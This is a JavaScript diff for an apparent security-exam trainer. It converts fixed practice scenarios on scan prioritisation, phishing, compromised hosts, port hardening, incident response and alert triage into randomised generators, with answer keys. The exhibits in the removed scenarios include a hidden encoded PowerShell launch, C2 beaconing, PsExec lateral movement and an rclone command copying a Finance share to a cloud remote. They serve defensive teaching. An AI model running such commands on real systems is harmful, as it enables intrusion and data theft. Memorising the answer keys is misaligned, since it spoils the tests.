+ {n:"DLP: 4,000 card numbers emailed to a personal Gmail account",c:"The sender resigned yesterday and leaves Friday.",a:0,s:7,x:"Likely insider theft of regulated data. Escalate; HR, legal, and possibly PCI reporting get involved."},
+ {n:"PowerShell execution, 300 times a day",c:"All from the SCCM client running signed, approved management scripts.",a:3,x:"Known-good management activity firing constantly. Add a narrow exclusion for the signed SCCM scripts."},
+ {n:"Phishing email detected",c:"The mail gateway caught it on arrival and never delivered it to any mailbox.",a:1,x:"Malicious, but stopped before delivery. Document it (and block the sender if not already) and close."},
+ {n:"New member of Domain Admins: svc_payroll2",c:"Matches approved change CHG-2214, done by the right admin inside the window.",a:2,x:"Authorized and documented. Close it with the ticket reference."},
+ {n:"Beaconing: finance laptop to 192.0.2.77 every 60 seconds",c:"Started at 02:00; the user is on vacation; the destination has no reputation.",a:0,s:9,x:"Regular C2 check-ins with no user present: escalate and isolate the laptop."},
+ {n:"Antivirus: EICAR test file detected on IT-TEST-01",c:"IT's monthly antivirus test, on the calendar, run by the AV admin.",a:2,x:"EICAR is a harmless test string, and the test was planned. Close it as benign."},
+ {n:"Large outbound transfer: 80 GB every night to 198.51.100.10",c:"198.51.100.10 is the company's offsite disaster-recovery site; the job is the approved replication.",a:3,x:"The rule fires every night on approved replication. Add a narrow exclusion for that source, destination, and job."},
+ {n:"VPN: 60 failed logons, then a success for jsmith",c:"All from one foreign IP; jsmith is in the office, not on VPN.",a:0,s:8,x:"A success after a burst of failures from an IP the user never uses is a compromised account. Escalate and contain."},
+ {n:"SSH brute force against web01",c:"Every attempt failed and fail2ban banned the IP after 5 tries; no successful logins.",a:1,x:"Real attack, already blocked by the control, with no success. Document and close."}];
+function genQueue(){
+  const by=a=>Q_POOL.filter(x=>x.a===a);
+  const set=shuffle([...pbqPickN(by(0),2),pbqPick(by(1)),pbqPick(by(2)),pbqPick(by(3)),pbqPick(Q_POOL.filter(x=>x.a!==0))]);
+  const seen=new Set(), uniq=set.filter(x=>!seen.has(x.n)&&seen.add(x.n));
+  const esc_=uniq.filter(x=>x.a===0).sort((a,b)=>b.s-a.s), first=esc_[0];
+  const opts=shuffle(uniq.filter(x=>x!==first)).slice(0,3).concat([first]).map(x=>uniq.indexOf(x)+1);
+  return {brief:`${uniq.length} alerts are waiting at the start of your shift. Use the context to choose a disposition for each, then decide which to work first.`,
+    ex:[{t:"Alert queue",table:[["#","Alert","Context"],...uniq.map((x,i)=>[String(i+1),x.n,x.c])]}],
+    items:[...uniq.map((x,i)=>({sec:i?null:"Disposition",q:`Alert ${i+1} · ${x.n.split(":")[0]}`,o:Q_DISP,a:x.a,x:x.x})),
+      {sec:"Priority",q:"Which alert do you work FIRST?",o:opts.map(String),a:opts.length-1,x:`Alert ${uniq.indexOf(first)+1}: ${first.n}. ${first.s>=10?"Active ransomware is doing damage minute by minute.":first.s>=9?"An active C2 channel means an attacker has live control.":"A live compromised account is the most urgent of these."}`}]};
+}
 const CPBQ=[
- {id:"vulnprio",name:"Prioritize the scan results",dom:2,
-  brief:"You are the vulnerability analyst. The weekly scan returned the findings below. Use the asset context, CVSS, EPSS, and the CISA KEV catalog to choose the right action for each finding, then pick what to fix first.",
-  ex:[{t:"Scan findings",table:[["ID","Host","Asset context","Finding","CVSS","EPSS","KEV"],
-    ["A","vpn01","Internet-facing VPN appliance","Unauthenticated remote code execution","9.8","0.97","Yes"],
-    ["B","hrdb01","Internal database with employee PII, reachable from user VLANs","SQL injection in internal HR app","8.8","0.02","No"],
-    ["C","labws07","Isolated test PC, no route to production, decommission in 5 days","Remote code execution in old browser","9.8","0.01","No"],
-    ["D","prn-3f","Office printer","SNMP v2c with default community string \"public\"","5.3","0.04","No"],
-    ["E","plc-hmi2","Plant-floor HMI; vendor has no patch; cannot be rebooted during production","Hard-coded credentials in HMI service","8.1","0.40","No"],
-    ["F","web03","Ubuntu web server (Linux)","Windows SMBv1 remote code execution, found by a non-credentialed scan; a credentialed scan shows no SMB service","8.1","0.95","Yes"]]}],
-  items:[
-   {sec:"Choose the action for each finding",q:"A · vpn01 remote code execution",o:["Emergency patch now","Fix in the next maintenance window","Apply a compensating control","Accept and document an exception","Mark as a false positive"],a:0,x:"Internet-facing, unauthenticated, 97% EPSS, and on KEV (actively exploited). This is an emergency change, not a scheduled one."},
-   {q:"B · hrdb01 SQL injection",o:["Emergency patch now","Fix in the next maintenance window","Apply a compensating control","Accept and document an exception","Mark as a false positive"],a:1,x:"High CVSS and sensitive data, but internal only, EPSS 2%, and not on KEV. It gets fixed on a short, scheduled timeline rather than as an emergency."},
-   {q:"C · labws07 browser RCE",o:["Emergency patch now","Fix in the next maintenance window","Apply a compensating control","Accept and document an exception","Mark as a false positive"],a:3,x:"Isolated, nothing to reach, low EPSS, and retired in five days. Accepting the risk with a documented, time-limited exception is reasonable."},
-   {q:"D · prn-3f default SNMP community",o:["Emergency patch now","Fix in the next maintenance window","Apply a compensating control","Accept and document an exception","Mark as a false positive"],a:1,x:"A real but low-severity configuration issue. Change the community string or move to SNMPv3 in the normal window."},
-   {q:"E · plc-hmi2 hard-coded credentials",o:["Emergency patch now","Fix in the next maintenance window","Apply a compensating control","Accept and document an exception","Mark as a false positive"],a:2,x:"There is no patch and the OT system cannot go down. Segment it, restrict access with ACLs, and monitor it: a compensating control."},
-   {q:"F · web03 SMBv1 finding",o:["Emergency patch now","Fix in the next maintenance window","Apply a compensating control","Accept and document an exception","Mark as a false positive"],a:4,x:"A Windows SMB flaw on a Linux host, from a non-credentialed scan, disproved by a credentialed scan: a false positive. The scary EPSS and KEV values belong to the CVE, not to this host."},
-   {sec:"Decide",q:"Which finding do you remediate FIRST?",o:["A","B","C","D","E","F"],a:0,x:"Exposure plus active exploitation (KEV) plus high exploit probability (EPSS) beats raw CVSS. A comes first."},
-   {q:"Which data point BEST shows a vulnerability is being exploited in the wild right now?",o:["Listed in CISA KEV","CVSS base score of 9.8","EPSS of 0.40","Found by a credentialed scan"],a:0,x:"KEV lists vulnerabilities with confirmed exploitation. EPSS is a probability of exploitation in the next 30 days; CVSS measures severity, not activity."}]},
- {id:"phish",name:"Analyze the phishing email",dom:3,
-  brief:"Thirty-seven employees received the email below. The proxy log shows who acted on it. Analyze the headers, then choose the response for each group.",
-  ex:[{t:"Email headers",log:`Return-Path: <billing@paypa1-secure.com>
-Received: from mail.paypa1-secure.com (mail.paypa1-secure.com [203.0.113.77])
-        by mx1.corp.com with ESMTPS; Fri, 13 Nov 2026 13:02:11 +0000
-From: "PayPal Billing" <billing@paypal.com>
-Reply-To: refunds@paypa1-secure.com
-Subject: Action required: refund of $482.19 on hold
-Authentication-Results: mx1.corp.com;
-       spf=pass (sender IP 203.0.113.77 is permitted) smtp.mailfrom=paypa1-secure.com;
-       dkim=none;
-       dmarc=fail (p=REJECT) header.from=paypal.com`},
-   {t:"Link in the body",log:`Visible text:  https://www.paypal.com/refunds
-Actual href:   https://paypa1-secure.com/signin?case=88231`},
-   {t:"Proxy log (13:02Z to 14:00Z)",log:`13:09:44Z  10.20.6.31  jwu      GET  https://paypa1-secure.com/signin?case=88231  200
-13:10:31Z  10.20.6.31  jwu      POST https://paypa1-secure.com/signin             302
-13:15:02Z  10.20.4.12  pgarcia  GET  https://paypa1-secure.com/signin?case=88231  200
-13:41:18Z  10.20.9.40  tbrown   GET  https://paypa1-secure.com/signin?case=88231  200`}],
-  items:[
-   {sec:"Header analysis",q:"Why did SPF pass?",o:["SPF checked the attacker's own look-alike domain in the Return-Path","paypal.com authorized the sending IP","The email was signed with DKIM","DMARC overrode the SPF result"],a:0,x:"SPF validates the envelope sender (Return-Path), paypa1-secure.com, which the attacker controls. A pass says nothing about the From: address."},
-   {q:"Which result proves the From: address is spoofed?",o:["dmarc=fail for header.from=paypal.com","spf=pass","dkim=none","The Received line"],a:0,x:"DMARC requires SPF or DKIM to pass for a domain that aligns with the visible From:. Neither aligns with paypal.com, so DMARC fails."},
-   {q:"What technique does paypa1-secure.com use?",o:["Typosquatting (look-alike domain)","URL shortening","DNS tunneling","Domain generation algorithm"],a:0,x:"The digit 1 replaces the letter l to imitate paypal."},
-   {sec:"Choose the response for each group",q:"jwu (GET, then POST to /signin)",o:["Reset the password, revoke sessions, and check MFA and mailbox rules","Send security awareness training only","Purge the email from the mailbox","No action needed"],a:0,x:"A POST to the sign-in page means jwu probably entered credentials. Treat the account as compromised."},
-   {q:"pgarcia and tbrown (GET only)",o:["Check their endpoints with EDR and confirm no credentials were entered","Reset the password, revoke sessions, and check MFA and mailbox rules","Purge the email from the mailbox","No action needed"],a:0,x:"They opened the page but did not submit. Verify the endpoints and confirm with the users; escalate if anything was entered or downloaded."},
-   {q:"The other 34 recipients",o:["Purge the email from all mailboxes","Reset all 34 passwords","Reimage their PCs","No action needed"],a:0,x:"Remove the message before anyone else clicks. Nothing suggests their credentials were exposed."},
-   {q:"The domain paypa1-secure.com",o:["Block it at the mail gateway and web proxy","Add it to the SPF record","Report it only after the investigation closes","No action needed"],a:0,x:"Blocking the sender and the landing page stops new deliveries and clicks while the investigation continues."},
-   {q:"jwu clicked at 13:10:31Z. The SOC is in Denver. What time was that locally?",o:["6:10:31 AM MST","7:10:31 AM MDT","8:10:31 PM MST","1:10:31 PM MST"],a:0,x:"November is standard time: MST = UTC-7. 13:10 - 7 h = 06:10 MST."}]},
- {id:"hosts",name:"Which hosts are compromised?",dom:3,
-  brief:"An EDR alert started an investigation. Review the evidence from four hosts, decide the status of each, and answer the follow-up questions.",
-  ex:[{t:"WS-14 (EDR and firewall)",log:`09:02:13Z  4688  OUTLOOK.EXE -> powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A...
-09:02:20Z  FW    10.20.7.14 -> 192.0.2.77:443  allow  bytes_out=512
-09:03:20Z  FW    10.20.7.14 -> 192.0.2.77:443  allow  bytes_out=512
-09:04:20Z  FW    10.20.7.14 -> 192.0.2.77:443  allow  bytes_out=514   (continues every 60 s)`},
-   {t:"DC-01 (Security log)",log:`09:20:01Z-09:21:40Z  4625 x 30  TargetUserName=Administrator  IpAddress=10.20.7.14  SubStatus=0xC000006A
-(no 4624 for Administrator from 10.20.7.14)`},
-   {t:"FS-01 (Security and System logs)",log:`09:34:52Z  4624  TargetUserName=svc_backup  LogonType=3  IpAddress=10.20.7.14
-09:34:55Z  7045  ServiceName=PSEXESVC  ImagePath=%SystemRoot%\\PSEXESVC.exe
-09:35:10Z  4688  PSEXESVC.exe -> cmd.exe /c rclone.exe copy D:\\Finance mega:fin`},
-   {t:"WS-22 (mail gateway and EDR)",log:`09:01:58Z  MAIL  Same message as WS-14's user received. Attachment Invoice.docm BLOCKED (macro policy)
-(no process or network events of interest on WS-22)`}],
-  items:[
-   {sec:"Status of each host",q:"WS-14",o:["Compromised: isolate","Targeted, not compromised: monitor","Clean: no action"],a:0,x:"A macro launched hidden, encoded PowerShell, followed by a 60-second beacon to 192.0.2.77."},
-   {q:"DC-01",o:["Compromised: isolate","Targeted, not compromised: monitor","Clean: no action"],a:1,x:"30 failed Administrator logons from WS-14 and no success. It was attacked but not breached; confirm the lockout policy and keep watching."},
-   {q:"FS-01",o:["Compromised: isolate","Targeted, not compromised: monitor","Clean: no action"],a:0,x:"A network logon from WS-14 as svc_backup, a PsExec service install, and rclone copying Finance to a cloud remote: compromised, with data leaving."},
-   {q:"WS-22",o:["Compromised: isolate","Targeted, not compromised: monitor","Clean: no action"],a:2,x:"The gateway blocked the macro attachment and no suspicious activity followed. Nothing to do beyond the purge for every recipient."},
-   {sec:"Follow-up",q:"Which host was patient zero?",o:["WS-14","DC-01","FS-01","WS-22"],a:0,x:"Everything else came from 10.20.7.14 after the macro ran there."},
-   {q:"Which account must be reset right away?",o:["svc_backup","Administrator","The WS-22 user","krbtgt"],a:0,x:"svc_backup was used to log on to FS-01 successfully. Administrator logons all failed."},
-   {q:"Which MITRE ATT&CK tactic does the FS-01 PsExec activity show?",o:["Lateral movement","Initial access","Reconnaissance","Impact"],a:0,x:"Using stolen credentials and a remote-execution tool to move from WS-14 to FS-01 is lateral movement."},
-   {q:"Which tactic does the rclone command show?",o:["Exfiltration","Persistence","Privilege escalation","Discovery"],a:0,x:"Copying the Finance share to a cloud remote (mega:) moves data out of the organization."}]},
- {id:"nmap",name:"Harden the web server",dom:2,
-  brief:"This Nmap scan is of web02, a public web server in the DMZ. The application uses a database on an internal server. Choose the action for each port, then answer the follow-up questions.",
-  ex:[{t:"nmap -sV -Pn web02.corp.com",log:`PORT     STATE    SERVICE        VERSION
-21/tcp   open     ftp            vsftpd 2.3.4
-22/tcp   open     ssh            OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
-23/tcp   open     telnet         Linux telnetd
-80/tcp   open     http           Apache httpd 2.4.58
-443/tcp  open     ssl/http       Apache httpd 2.4.58
-3306/tcp open     mysql          MySQL 8.0.36
-3389/tcp filtered ms-wbt-server`}],
-  items:[
-   {sec:"Action for each port",q:"21/tcp ftp (vsftpd 2.3.4)",o:["Disable the service","Keep open to the internet","Restrict to admin or internal sources","No action needed"],a:0,x:"A web server does not need FTP, and vsftpd 2.3.4 is the release that shipped with a backdoor. Disable it, and check the host for compromise."},
-   {q:"22/tcp ssh",o:["Disable the service","Keep open to the internet","Restrict to admin or internal sources","No action needed"],a:2,x:"Admins need SSH, but not from the whole internet. Allow only admin IPs or a jump host, with key authentication."},
-   {q:"23/tcp telnet",o:["Disable the service","Keep open to the internet","Restrict to admin or internal sources","No action needed"],a:0,x:"Telnet sends credentials in clear text, and SSH already does the job."},
-   {q:"80/tcp http",o:["Disable the service","Keep open to the internet","Restrict to admin or internal sources","No action needed"],a:1,x:"Keep it for the public site, redirecting to HTTPS."},
-   {q:"443/tcp https",o:["Disable the service","Keep open to the internet","Restrict to admin or internal sources","No action needed"],a:1,x:"This is the public site itself."},
-   {q:"3306/tcp mysql",o:["Disable the service","Keep open to the internet","Restrict to admin or internal sources","No action needed"],a:0,x:"The application's database lives on an internal server, so a MySQL listener on the public web server should not be running at all. If it were truly needed, it would be bound to localhost or restricted."},
-   {q:"3389/tcp filtered",o:["Disable the service","Keep open to the internet","Restrict to admin or internal sources","No action needed"],a:3,x:"Filtered means a firewall is already dropping the probes. Nothing is exposed."},
-   {sec:"Follow-up",q:"Which Nmap option produced the VERSION column?",o:["-sV","-O","-sS","-Pn"],a:0,x:"-sV probes open ports to identify the service and version. -O guesses the OS, -sS is a SYN scan, and -Pn skips host discovery."},
-   {q:"Which finding is MOST urgent?",o:["vsftpd 2.3.4 on 21/tcp","OpenSSH on 22/tcp","Apache on 80/tcp","3389 filtered"],a:0,x:"A known backdoored version reachable from the internet beats everything else here."}]},
- {id:"irphase",name:"Ransomware response",dom:3,
-  brief:"A ransomware incident is being worked. Place each action in its incident response phase, then put the evidence in collection order.",
-  ex:[{t:"Situation",log:`11:02Z  SIEM: 18,000 files renamed to *.lck on FS-01 in 6 minutes
-11:05Z  EDR: same process tree on WS-31 and WS-40
-        Initial access: unpatched VPN appliance (KEV-listed CVE)
-        Offline backups from last night are available`}],
-  items:[
-   {sec:"Which phase is each action in?",q:"Writing the ransomware playbook and running a tabletop exercise last quarter",o:["Preparation","Detection","Analysis","Containment","Eradication","Recovery","Post-incident"],a:0,x:"Plans, playbooks, tools, and exercises before an incident are preparation."},
-   {q:"The SIEM alert on mass file renames",o:["Preparation","Detection","Analysis","Containment","Eradication","Recovery","Post-incident"],a:1,x:"Noticing the event is detection."},
-   {q:"Working out which hosts are affected and how the attacker got in",o:["Preparation","Detection","Analysis","Containment","Eradication","Recovery","Post-incident"],a:2,x:"Scoping, the root cause, and the timeline are analysis."},
-   {q:"Isolating FS-01, WS-31, and WS-40 with EDR and disabling the abused account",o:["Preparation","Detection","Analysis","Containment","Eradication","Recovery","Post-incident"],a:3,x:"Stopping the spread is containment."},
-   {q:"Removing persistence, reimaging hosts, and patching the VPN appliance",o:["Preparation","Detection","Analysis","Containment","Eradication","Recovery","Post-incident"],a:4,x:"Removing the attacker and the hole they used is eradication."},
-   {q:"Restoring files from offline backups and watching for reinfection",o:["Preparation","Detection","Analysis","Containment","Eradication","Recovery","Post-incident"],a:5,x:"Returning to normal operations under monitoring is recovery."},
-   {q:"Lessons-learned meeting and after action report",o:["Preparation","Detection","Analysis","Containment","Eradication","Recovery","Post-incident"],a:6,x:"Reviewing and improving after the incident is post-incident activity."},
-   {sec:"Collect evidence from WS-31 in order of volatility",q:"RAM (memory capture)",o:["1st","2nd","3rd","4th"],a:0,x:"Memory disappears at power-off, so it goes first."},
-   {q:"Swap file and pagefile",o:["1st","2nd","3rd","4th"],a:1,x:"Swap is on disk but changes constantly while the system runs."},
-   {q:"Full disk image, hashed",o:["1st","2nd","3rd","4th"],a:2,x:"The disk is stable enough to image after the volatile data."},
-   {q:"Logs already forwarded to the SIEM",o:["1st","2nd","3rd","4th"],a:3,x:"Remote logs are already preserved off the host, so they are least volatile."}]},
- {id:"queue",name:"Work the alert queue",dom:1,
-  brief:"Six alerts are waiting at the start of your shift. Use the context to choose a disposition for each, then decide which to work first.",
-  ex:[{t:"Alert queue",table:[["#","Alert","Context"],
-    ["1","Impossible travel: mlee, Denver then Frankfurt in 20 minutes","Frankfurt is the egress of the company's own cloud VPN, which mlee connected to. This fires for VPN users every day."],
-    ["2","EDR: adware quarantined in Downloads","The file never ran; EDR blocked and quarantined it on write."],
-    ["3","Mass file rename to *.lck on FS-01","18,000 files in 6 minutes; the process is unsigned and running from C:\\ProgramData."],
-    ["4","Port scan from 10.0.0.50 across all subnets","Change ticket CHG-3301: the approved pen-test firm is testing from 10.0.0.50 this week."],
-    ["5","DLP: 4,000 card numbers emailed to a personal Gmail account","Sender resigned yesterday and leaves Friday."],
-    ["6","PowerShell execution, 300 times a day","All from the SCCM client running signed, approved management scripts."]]}],
-  items:[
-   {sec:"Disposition",q:"Alert 1 · impossible travel",o:["Escalate (true positive)","Close: already contained (true positive)","Close as benign (authorized)","Close and tune (false positive)"],a:3,x:"The rule keeps mistaking the company's VPN egress for travel. Close it and add the VPN egress IPs to known locations."},
-   {q:"Alert 2 · quarantined adware",o:["Escalate (true positive)","Close: already contained (true positive)","Close as benign (authorized)","Close and tune (false positive)"],a:1,x:"Real, unwanted software, but the control worked before it ran. Document it and close."},
-   {q:"Alert 3 · mass file rename",o:["Escalate (true positive)","Close: already contained (true positive)","Close as benign (authorized)","Close and tune (false positive)"],a:0,x:"An unsigned process from ProgramData encrypting thousands of files is active ransomware."},
-   {q:"Alert 4 · port scan",o:["Escalate (true positive)","Close: already contained (true positive)","Close as benign (authorized)","Close and tune (false positive)"],a:2,x:"The detection was correct, and the activity is authorized by CHG-3301. Close it with the ticket reference; no tuning is needed for a one-week test."},
-   {q:"Alert 5 · DLP card numbers",o:["Escalate (true positive)","Close: already contained (true positive)","Close as benign (authorized)","Close and tune (false positive)"],a:0,x:"Likely insider data theft involving regulated data. Escalate; HR, legal, and possibly PCI reporting get involved."},
-   {q:"Alert 6 · PowerShell from SCCM",o:["Escalate (true positive)","Close: already contained (true positive)","Close as benign (authorized)","Close and tune (false positive)"],a:3,x:"Known-good management activity firing 300 times a day. Add a narrow exclusion for the signed SCCM scripts."},
-   {sec:"Priority",q:"Which alert do you work FIRST?",o:["3","5","1","6"],a:0,x:"Active ransomware is spreading damage minute by minute. The DLP case is serious but already happened; the ransomware is still happening."}]},
-];
+ {id:"vulnprio",name:"Prioritize the scan results",dom:2,gen:genVuln},
+ {id:"phish",name:"Analyze the phishing email",dom:3,gen:genPhish},
+ {id:"hosts",name:"Which hosts are compromised?",dom:3,gen:genHosts},
+ {id:"nmap",name:"Harden the web server",dom:2,gen:genNmap},
+ {id:"irphase",name:"Incident response phases",dom:3,gen:genIR},
+ {id:"queue",name:"Work the alert queue",dom:1,gen:genQueue}];
 function viewCPBQ(){
   const m=M("pbq"); const cleared=id=>pbqClears(id)>0;
-  app.innerHTML=modHead(m)+`<p style="max-width:70ch;margin:0 0 14px">Exam-style simulations. Read the exhibits, answer every drop-down, then check. Each item is explained. A run at ${Math.round(PBQ_CLEAR*100)}% or better clears the PBQ.</p>
-  <div class="lr-list">${CPBQ.map((x,i)=>`<button class="lr-case${cleared(x.id)?" solved":""}" type="button" data-i="${i}"><span class="tag">${esc(DOM[x.dom])}</span><b>PBQ ${i+1} · ${esc(x.name)}</b><small>${x.items.length} items${cleared(x.id)?" · ✓ Cleared":""}${(P.pbq[x.id]||[]).length?` · best ${Math.max(...P.pbq[x.id].map(r=>Math.round(r.score/r.total*100)))}%`:""}</small></button>`).join("")}</div>`;
+  app.innerHTML=modHead(m)+`<p style="max-width:70ch;margin:0 0 14px">Exam-style simulations. Every run is a new variation: different findings, hosts, alerts, names, and times, with the answer choices shuffled. Read the exhibits, answer every drop-down, then check. A run at ${Math.round(PBQ_CLEAR*100)}% or better clears the PBQ; clear each one ${PBQ_NEED} times to master it.</p>
+  <div class="lr-list">${CPBQ.map((x,i)=>{ const h=P.pbq[x.id]||[]; return `<button class="lr-case${pbqClears(x.id)>=PBQ_NEED?" solved":""}" type="button" data-i="${i}"><span class="tag">${esc(DOM[x.dom])}</span><b>PBQ ${i+1} · ${esc(x.name)}</b><small>${pbqClears(x.id)} of ${PBQ_NEED} clears${h.length?` · best ${Math.max(...h.map(r=>Math.round(r.score/r.total*100)))}%`:""}</small></button>`; }).join("")}</div>`;
   app.querySelectorAll(".lr-case").forEach(b=>b.addEventListener("click",()=>runCPBQ(+b.dataset.i)));
 }
 function cpbqEx(e){
   const body=e.table?`<div class="tblwrap"><table class="zt pbqt"><thead><tr>${e.table[0].map(h=>`<th>${esc(h)}</th>`).join("")}</tr></thead><tbody>${e.table.slice(1).map(r=>`<tr>${r.map(c=>`<td>${esc(c)}</td>`).join("")}</tr>`).join("")}</tbody></table></div>`:logBlock(e.log);
   return `<div class="pbq-ex"><h4>${esc(e.t)}</h4>${body}</div>`;
 }
-function runCPBQ(i){
-  const x=CPBQ[i]; let checked=false;
+function runCPBQ(i,keep){
+  const x=CPBQ[i], v=keep||x.gen(); let checked=false;
+  /* one shuffled order per distinct option list, so rows that share a list show it in the same order */
+  const orders={}; const orderFor=it=>{ if(it.ord) return it.o.map((_,j)=>j); const k=JSON.stringify(it.o); return orders[k]||(orders[k]=shuffle(it.o.map((_,j)=>j))); };
   app.innerHTML=modHead(M("pbq"))+`<div class="examtop"><button class="chipbtn" id="pbqlist" type="button">← All PBQs</button><span>PBQ ${i+1} of ${CPBQ.length}: ${esc(x.name)}</span></div>
-   <div class="card"><div class="q-meta">${domTag(x.dom)}<span class="tag">Performance-based</span></div><p style="margin:.2em 0 0;max-width:80ch">${esc(x.brief)}</p>${x.ex.map(cpbqEx).join("")}</div>
-   <div class="card" style="margin-top:14px" id="pbqitems">${x.items.map((it,k)=>`${it.sec?`<h4 class="pbq-sec">${esc(it.sec)}</h4>`:""}<div class="pbq-row" data-k="${k}"><label for="pq${k}">${esc(it.q)}</label><select id="pq${k}"><option value="">Choose…</option>${it.o.map((o,j)=>`<option value="${j}">${esc(o)}</option>`).join("")}</select><div class="pbq-x" hidden></div></div>`).join("")}
-   <div class="q-actions" style="margin-top:14px"><button class="btn" id="pbqcheck" type="button">Check answers</button><button class="btn ghost" id="pbqreset" type="button" hidden>Try again</button><button class="btn ghost" id="pbqnext" type="button" hidden>${i+1<CPBQ.length?"Next PBQ":"All PBQs"}</button></div><div class="fb" id="pbqfb" hidden></div></div>`;
+   <div class="card"><div class="q-meta">${domTag(x.dom)}<span class="tag">Performance-based</span></div><p style="margin:.2em 0 0;max-width:80ch">${esc(v.brief)}</p>${v.ex.map(cpbqEx).join("")}</div>
+   <div class="card" style="margin-top:14px" id="pbqitems">${v.items.map((it,k)=>`${it.sec?`<h4 class="pbq-sec">${esc(it.sec)}</h4>`:""}<div class="pbq-row" data-k="${k}"><label for="pq${k}">${esc(it.q)}</label><select id="pq${k}"><option value="">Choose…</option>${orderFor(it).map(j=>`<option value="${j}">${esc(it.o[j])}</option>`).join("")}</select><div class="pbq-x" hidden></div></div>`).join("")}
+   <div class="q-actions" style="margin-top:14px"><button class="btn" id="pbqcheck" type="button">Check answers</button><button class="btn" id="pbqnew" type="button" hidden>New variation</button><button class="btn ghost" id="pbqreset" type="button" hidden>Retry this one</button><button class="btn ghost" id="pbqnext" type="button" hidden>${i+1<CPBQ.length?"Next PBQ":"All PBQs"}</button></div><div class="fb" id="pbqfb" hidden></div></div>`;
   $("#pbqlist").addEventListener("click",viewCPBQ);
   $("#pbqcheck").addEventListener("click",()=>{
     if(checked) return;
     const sels=[...app.querySelectorAll("#pbqitems select")]; const empty=sels.filter(s=>s.value==="").length;
     if(empty){ $("#pbqfb").hidden=false; $("#pbqfb").innerHTML=`<div class="v bad">Answer all ${empty} remaining item${empty>1?"s":""} first.</div>`; return; }
     checked=true; let score=0;
-    sels.forEach((s,k)=>{ const it=x.items[k], ok=+s.value===it.a; if(ok) score++; const row=s.closest(".pbq-row"); row.classList.add(ok?"ok":"bad"); s.disabled=true;
+    sels.forEach((s,k)=>{ const it=v.items[k], ok=+s.value===it.a; if(ok) score++; const row=s.closest(".pbq-row"); row.classList.add(ok?"ok":"bad"); s.disabled=true;
       const xe=row.querySelector(".pbq-x"); xe.hidden=false; xe.innerHTML=`<b>${ok?"✓ Correct.":"✗ Answer: "+esc(it.o[it.a])+"."}</b> ${esc(it.x)}`; });
-    const total=x.items.length, pct=Math.round(score/total*100);
-    if(mode==="student"){ (P.pbq[x.id]=P.pbq[x.id]||[]).push({score,total,at:Date.now()}); save(); }
-    $("#pbqfb").hidden=false; $("#pbqfb").innerHTML=`<div class="v ${score/total>=PBQ_CLEAR?"ok":"bad"}">${score} of ${total} (${pct}%). ${score/total>=PBQ_CLEAR?"PBQ cleared.":`${Math.round(PBQ_CLEAR*100)}% clears it. Read the explanations, then try again.`}</div>`;
-    $("#pbqcheck").hidden=true; $("#pbqreset").hidden=false; $("#pbqnext").hidden=false;
+    const total=v.items.length, pct=Math.round(score/total*100), clear=score/total>=PBQ_CLEAR;
+    if(mode==="student"&&!keep){ (P.pbq[x.id]=P.pbq[x.id]||[]).push({score,total,at:Date.now()}); save(); }
+    $("#pbqfb").hidden=false; $("#pbqfb").innerHTML=`<div class="v ${clear?"ok":"bad"}">${score} of ${total} (${pct}%). ${clear?`Cleared · ${pbqClears(x.id)} of ${PBQ_NEED} clears.`:`${Math.round(PBQ_CLEAR*100)}% clears it. Read the explanations, then try a new variation.`}</div>${keep?`<p class="note">Retries of the same variation are for review and do not count toward clears.</p>`:""}`;
+    $("#pbqcheck").hidden=true; $("#pbqnew").hidden=false; $("#pbqreset").hidden=false; $("#pbqnext").hidden=false;
   });
-  $("#pbqreset").addEventListener("click",()=>runCPBQ(i));
+  $("#pbqnew").addEventListener("click",()=>runCPBQ(i));
+  $("#pbqreset").addEventListener("click",()=>runCPBQ(i,v));
   $("#pbqnext").addEventListener("click",()=>i+1<CPBQ.length?runCPBQ(i+1):viewCPBQ());
 }
 /* Threat Actor Profiler: drag attribute tiles onto each actor's profile card. Some slots accept more than one
